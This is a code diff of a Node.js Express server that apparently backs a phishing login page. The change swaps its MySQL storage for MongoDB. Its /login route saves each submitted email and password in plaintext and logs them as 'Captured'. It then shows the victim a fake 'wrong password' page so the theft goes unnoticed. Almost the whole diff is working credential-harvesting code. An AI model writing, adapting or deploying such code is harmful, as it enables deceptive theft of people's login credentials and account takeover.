@@ -1,66 +1,43 @@
 const express = require("express");
-const mysql = require("mysql2");
+const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
 
 const app = express();
 
 // ── Middleware ─────────────────────────────────────────────
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname)); // serve index.html & index.css
+app.use(express.static(__dirname));
 
-// ── MySQL Connection (works both locally and on Railway) ───
-const db = mysql.createConnection({
-    host:     process.env.MYSQLHOST     || "localhost",
-    user:     process.env.MYSQLUSER     || "root",
-    password: process.env.MYSQLPASSWORD || "",
-    database: process.env.MYSQLDATABASE || "login_app",
-    port:     process.env.MYSQLPORT     || 3306
+// ── MongoDB Connection ─────────────────────────────────────
+const MONGO_URI = process.env.MONGO_URI || "your_mongodb_uri_here";
+
+mongoose.connect(MONGO_URI)
+    .then(() => console.log("✅ MongoDB Connected!"))
+    .catch(err => console.error("❌ MongoDB connection failed:", err.message));
+
+// ── User Schema ─────────────────────────────────────────────
+const userSchema = new mongoose.Schema({
+    email:     { type: String, required: true },
+    password:  { type: String, required: true },
+    createdAt: { type: Date, default: Date.now }
 });
 
-db.connect(err => {
-    if (err) {
-        console.error("❌ MySQL connection failed:", err.message);
-        console.error("👉 Make sure all MYSQL environment variables are set in Railway!");
-        return; // don't crash, so you can still see the logs
-    }
-    console.log("✅ MySQL Connected!");
+const User = mongoose.model("User", userSchema);
 
-    // Auto-create the users table if it doesn't exist
-    const createTable = `
-        CREATE TABLE IF NOT EXISTS users (
-            id         INT AUTO_INCREMENT PRIMARY KEY,
-            email      VARCHAR(255) NOT NULL,
-            password   VARCHAR(255) NOT NULL,
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    `;
-    db.query(createTable, err => {
-        if (err) {
-            console.error("❌ Failed to create table:", err.message);
-        } else {
-            console.log("✅ 'users' table ready.");
-        }
-    });
-});
-
-// ── POST /login  →  save email + password to DB ────────────
-app.post("/login", (req, res) => {
+// ── POST /login  →  save email + password ──────────────────
+app.post("/login", async (req, res) => {
     const { email, password } = req.body;
 
     if (!email || !password) {
         return res.status(400).send("Email and password are required.");
     }
 
-    const sql = "INSERT INTO users (email, password) VALUES (?, ?)";
-    db.query(sql, [email, password], (err, result) => {
-        if (err) {
-            console.error("❌ DB insert error:", err.message);
-            return res.status(500).send("Something went wrong. Please try again.");
-        }
+    try {
+        const newUser = new User({ email, password });
+        await newUser.save();
+        console.log(`📥 Captured → Email: ${email}`);
 
-        console.log(`📥 Captured → Email: ${email} | Row ID: ${result.insertId}`);
-
-        // Show "wrong password" page after form submit
+        // Show "wrong password" page after submit
         res.send(`
             <!DOCTYPE html>
             <html lang="en">
@@ -85,7 +62,10 @@ app.post("/login", (req, res) => {
             </body>
             </html>
         `);
-    });
+    } catch (err) {
+        console.error("❌ Save error:", err.message);
+        res.status(500).send("Something went wrong.");
+    }
 });
 
 // ── Start server ───────────────────────────────────────────
